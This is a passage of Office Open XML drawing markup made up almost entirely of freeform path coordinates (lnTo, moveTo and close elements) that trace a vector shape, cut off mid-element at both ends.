                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3668" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3558" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3411" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3301" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3301" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3265" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2751" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2531" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2164" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1577" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1577" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1687" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1944" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3998" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4145" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4475" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4475" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4365" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4218" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2164" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="4733"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="917" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="880" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1944" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3191" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3998" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4108" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4108" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3998" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3558" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1467" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1247" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="880" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="587" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="660" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="770" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="917" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2384" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2494" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="3119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2898" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3448" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4108" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4328" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4695" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5135" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5062" y="5063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4695" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4805" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4915" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5135" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5392" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5942" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6676" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6896" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7226" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8033" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6749" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5942" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5135" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5135" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5172" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5832" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4915" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4915" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4915" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5062" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5172" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6529" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7446" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7556" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7446" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7263" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6896" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6896" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="4036"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7263" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="2422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8363" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8840" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8657" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8730" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8840" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="3926"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="3009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7446" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7373" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7336" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7373" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7556" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="1248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7923" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8290" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9060" y="514"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13279" y="9318"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13426" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13352" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13242" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12985" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="11409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="11299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="9318"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13609" y="9648"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13719" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13792" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13939" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13829" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12765" y="11299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13682" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13719" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13462" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13059" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12398" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12325" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="11409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11481" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11775" y="11299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12068" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13132" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13352" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13572" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="9648"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9060" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8804" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8290" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8033" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7813" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6896" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5392" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5025" y="588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4695" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4585" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="1248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4475" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
